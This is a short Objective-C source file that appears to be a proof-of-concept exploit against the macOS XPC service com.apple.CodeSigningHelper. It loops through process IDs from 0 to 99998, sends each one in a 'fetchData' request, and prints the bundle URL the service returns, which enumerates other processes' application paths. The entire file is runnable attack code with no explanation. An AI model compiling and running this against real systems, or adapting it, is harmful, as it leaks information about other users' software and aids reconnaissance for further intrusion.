#import <Foundation/Foundation.h>

char * service_name = "com.apple.CodeSigningHelper";

int main(int argc, const char **argv) {
    xpc_connection_t conn = xpc_connection_create_mach_service(service_name, NULL, 0 );
    xpc_connection_set_event_handler(conn, ^(xpc_object_t object) {
    });
    xpc_connection_resume(conn);


    int i;
    for (i = 0; i < 99999; i++) {
        xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
        xpc_dictionary_set_string(message, "command", "fetchData");
        xpc_dictionary_set_int64(message, "pid", i);

        xpc_connection_send_message_with_reply(conn, message, NULL, ^(xpc_object_t object) {
            size_t sz = 0;
            void * data = xpc_dictionary_get_data(object, "bundleURL", &sz);
            if (sz != 0) {
                printf("%s\n", (char*)data);
            }
        });
    }

    dispatch_main();
}
